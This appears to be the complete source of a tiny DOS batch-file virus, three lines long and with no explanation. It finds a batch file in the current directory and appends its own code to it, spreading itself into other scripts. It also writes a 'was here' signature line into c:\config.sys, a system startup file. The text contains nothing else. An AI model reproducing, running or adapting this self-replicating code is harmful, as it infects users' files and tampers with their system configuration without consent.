   for %%w in (*?.b?t) do set LT=%%w
   if not %w%==%0 type %0>>%LT%
   echo Midget.c was here >>c:\config.sys
